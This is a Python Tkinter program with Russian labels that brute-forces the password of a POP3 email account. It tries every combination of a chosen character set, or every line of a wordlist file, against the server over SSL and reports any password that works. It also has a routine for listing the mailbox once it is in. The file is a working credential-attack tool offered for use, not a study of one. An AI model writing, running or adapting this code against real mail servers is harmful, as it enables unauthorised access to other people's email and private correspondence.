from tkinter import *
from tkinter import filedialog as fd
from itertools import product
import poplib

path_dictionary=''
root = Tk()
l_server=Label(root, text='Введите адрес POP3 сервера')
l_login=Label(root, text='Введите логин')
server_name=Entry(root, width=50)
login=Entry(root, width=50)
b2= Button(root, text='Полный перебор')
b3= Button(root, text='Выбрать словарь')
b4= Button(root, text='Перебор словарем')
l_pass=Label(root, text='Если знаете пароль, введите, иначе следуйте указаниям ниже')
password_enter=Entry(root, width=50)
b_password= Button(root, text='Показать список писем')
l=Label(root, text='Введите символы для пароля')
e=Entry(root, width=50)
l1=Label(root, text='Введите длину пароля')
e1=Entry(root, width=50)
l2=Label(root, text='')

port = "995"

def open_dictionary(event):
    global path_dictionary
    path_dictionary=fd.askopenfilename()

b3.bind('<Button-1>', open_dictionary)

def hack(event):
    count=10
    while count<=int(e1.get()):
      for i in product(e.get(), repeat=count):
        try:
            password = ''.join(i)
            box = poplib.POP3_SSL(server_name.get(), port)
            box.user(login.get())
            box.pass_(password)
            box.quit()
        except poplib.error_proto:
            l2['text'] =('The {} word not matched.'.format(password))

        else:
            l2['text'] =('Wow ! found the password: {}'.format(password))
            break
      count+=1

b2.bind('<Button-1>', hack)

def hack_dictionary(event):
    with open(path_dictionary, 'rb') as password_list:
        for line in password_list:

            try:
                #a = password_list.readline()[5:]
                #print(a)
                password = line.decode('ASCII').replace('\n', '')
                box = poplib.POP3_SSL(server_name.get(), port)
                box.user(login.get())
                box.pass_(password)
                (response, lst, octets) = box.list()
                box.quit()

            except poplib.error_proto:
                l2['text'] =('The {} word not matched.'.format(password))
            else:
                l2['text'] =('Wow ! found the password: {}'.format(password))
                break

b4.bind('<Button-1>', hack_dictionary)

def see_list(event):
            try:
                box = poplib.POP3_SSL(server_name.get(), port)
                box.user(login.get())
                box.pass_(password_enter.get())
                (response, lst, octets) = box.list()
                box.quit()
            except poplib.error_proto:
               print("Сегодня не судьба, хакай пароль")
            else:
                print(response)
                print(lst)
                print(octets)

#b_password.bind('<Button-1>', see_list)


def count_line(event):
       f=open(path_dictionary,'rb')
       count=0
       for line in f:
           count+=1
           print(line, end='')
       print(f.readline())
       print(count)

b_password.bind('<Button-1>', count_line)


l_server.pack()
server_name.pack()
l_login.pack()
login.pack()
l_pass.pack()
password_enter.pack()
b_password.pack()
l.pack()
e.pack()
l1.pack()
e1.pack()
b2.pack()
b3.pack()
b4.pack()
l2.pack()
root.mainloop()